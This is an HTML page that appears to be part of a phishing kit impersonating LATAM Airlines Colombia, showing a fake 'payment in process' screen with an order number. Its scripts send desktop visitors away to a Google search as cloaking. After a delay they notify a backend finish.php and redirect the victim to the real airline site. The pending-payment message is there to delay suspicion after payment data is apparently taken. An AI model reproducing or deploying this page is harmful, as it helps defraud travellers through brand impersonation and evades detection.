

<script>
  const esDispositivoMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

  if (esDispositivoMovil) {

    console.log("Estás navegando desde un dispositivo móvil");
  } else {
    window.location.href = "https://www.google.com/search?q=https%3A%2F%2Fpeople.com%2F&rlz=1C1UUXU_esCO1026CO1026&sxsrf=AB5stBhY1HWRiHp1kz7EliMShtk-hj13Fg%3A1688777086772&ei=frGoZPXgLquHwbkP15iRwAg&ved=0ahUKEwj1l_Ly8P3_AhWrQzABHVdMBIgQ4dUDCA8&uact=5&oq=https%3A%2F%2Fpeople.com%2F&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIICAAQgAQQywEyCAgAEIAEEMsBMggIABCABBDLATIICAAQgAQQywEyCAgAEIAEEMsBMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMgYIABAeEA0yBggAEB4QDToECCMQJzoHCCMQigUQJzoLCAAQgAQQsQMQgwE6BQgAEIAEOggIABCABBCxAzoICC4QgAQQsQM6CwgAEIoFELEDEIMBOgUILhCABDoLCC4QgAQQsQMQgwE6DQguEIoFELEDEIMBEEM6CggAEIAEEBQQhwI6EAguEIoFELEDEMcBENEDEEM6DgguEIAEELEDEMcBENEDOhsILhCKBRCxAxCDARBDEJcFENwEEN4EEOAEGAE6BwgjEOoCECc6FQgAEAMQjwEQ6gIQtAIQjAMQ5QIYAjoVCC4QAxCPARDqAhC0AhCMAxDlAhgCSgQIQRgAUABY6SZgnCloA3ABeACAAaUDiAG_CZIBBzItMi4xLjGYAQCgAQGgAQKwARTAAQHaAQYIARABGBTaAQYIAhABGAs&sclient=gws-wiz-serp";
    console.log("Estás navegando desde un dispositivo de escritorio");
  }
</script>
<script>
  // Espera 10 segundos antes de hacer la solicitud AJAX y redirigir
  setTimeout(function() {
    // Hacer la solicitud al servidor para cambiar el valor de $enviar a "2"
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        // Manejar la respuesta del servidor si es necesario
        console.log("Valor de enviar cambiado a 2");
        // Redirigir a otra página después de cambiar el valor
        window.location.href = 'https://www.latamairlines.com/co/es/experiencia/digital/check-in-automatico'; // Reemplaza 'otra_pagina.php' con la URL de la nueva página
      }
    };
    xhttp.open("POST", "finish.php", true); // La URL del archivo PHP que contiene este código
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send("setEnvio=1"); // Datos adicionales que puedes enviar al servidor si es necesario
  }, 25000); // 10 segundos
</script>

<!DOCTYPE html>
<html lang="en">

<head>
  <style type="text/css">
    @charset "UTF-8";

    [ng\:cloak],
    [ng-cloak],
    [data-ng-cloak],
    [x-ng-cloak],
    .ng-cloak,
    .x-ng-cloak,
    .ng-hide:not(.ng-hide-animate) {
      display: none !important;
    }

    ng\:form {
      display: block;
    }

    .ng-animate-shim {
      visibility: hidden;
    }

    .ng-anchor {
      position: absolute;
    }
  </style>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="initial-scale=1.0, width=device-width">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="assets/icons/favicon.png">
  <script src="https://use.fontawesome.com/b1ad4d7e81.js"></script>
  <link href="https://use.fontawesome.com/b1ad4d7e81.css" media="all" rel="stylesheet">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
  
  <title>Cotiza Vuelos, Paquetes, Hoteles y Carros | LTM Colombia</title>
  <link rel="stylesheet" href="css/normalize.css?v=166235808">
  <link rel="stylesheet" href="css/utils.css?v=1160007667">
  <link rel="stylesheet" href="css/home.css?v=555593487">
  <link rel="stylesheet" href="css/dp.css?v=1066115301">
  <link rel="stylesheet" href="css/banks.css?v=224270120">
  <style>
    @keyframes loading {
      0% {
        transform: rotate(0)
      }

      to {
        transform: rotate(360deg)
      }
    }

    .ag-textarea .MuiInputBase-input::-webkit-scrollbar {
      height: 6px;
      width: 6px
    }

    .ag-textarea .MuiInputBase-input::-webkit-scrollbar-track {
      background: transparent
    }

    .ag-textarea .MuiInputBase-input::-webkit-scrollbar-thumb {
      background: #dfdfdf;
      border-radius: 4px
    }

    .ag-textarea .MuiInputBase-input::-webkit-scrollbar-thumb:hover {
      background: #d4d4d4
    }
  </style>
</head>

<body ng-controller="startController" class="ng-scope"><div id="ag-1717684739191"></div>

    <div class="Wrapper" id="Wrapper">

        <!-- uiView:  --><div ui-view="" style="height:100%;" class="ng-scope">

    
        <meta charset="UTF-8" class="ng-scope">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" class="ng-scope">
        <title class="ng-scope">Pago Fallido | LTM Colombia</title>
        <link rel="shortcut icon" href="./assets/favicon.png" type="image/x-icon" class="ng-scope">
        <!-- CSS -->
        <link rel="stylesheet" href="./css/normalize.css" class="ng-scope">
        <link rel="stylesheet" href="./css/utils.css" class="ng-scope">
        <link rel="stylesheet" href="./css/main.css" class="ng-scope">
        <link rel="stylesheet" href="./css/hotel-datepicker.css" class="ng-scope">
        <!-- JS -->
        <script src="./js/functions.js" class="ng-scope"></script>
    
    
        <nav class="p-fixed border-box bg-deep-blue p-3 ng-scope">
            <div class="d-flex justify-space-between align-items-center">
                <div>
                    <img width="105px" src="./assets/logos/LATAM_navbar.png">
                </div>
                <div class="d-flex justify-content-center align-items-center">
                    <button class="btn-session" >Iniciar sesión
                </button>
                    <img class="navbar--hamburger" src="./assets/media/hamburger_a.png">
                </div>
            </div>
          
        </nav>
        <main class="p-3  ng-scope" style="margin-top: 140px;">

        <center>


            <img src="img/chichon.png" style="width:70%; height:auto;" alt="" srcset="">
          
            <span id="label-flight-go-resume" class="align-items-center fs-4 tc-ocean">
               
                <p class=" fw-light" style="font-size:20px"> Tu viaje  <b style="font-family:'Latam Bold';" class="ng-binding">  </b> está casi listo</p>
                
                <p class="fw-light ng-binding" style="color:gray;">Nº de orden LA0239890QQDD. </p>
            </span>
          
                <p class="fw-light ng-binding" style="color:gray;">Tu pago se encuentra en proceso de confirmacion, enviaremos una copia del comprobante de pago a tu email  o un SMS a tu número  una vez esté listo, por favor espera de 12 a 24 horas, antes de volver a intentar el pago.</p>
                <br> 
            <button ng-click="goHome()" class="btn-success mt-1 mb-5">Ir al inicio</button>
        </center>

         
          
        </main>
      
        <!-- LOADER FULL -->
        <div class="loader-full ng-scope ng-hide" ng-show="loader">
            <span class="loader"></span>
            <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>
        </div>
        <!-- SCRIPTS -->
        <script src="./js/flight-resume.js" class="ng-scope"></script>
    

</div>

    </div>






</body>

</html>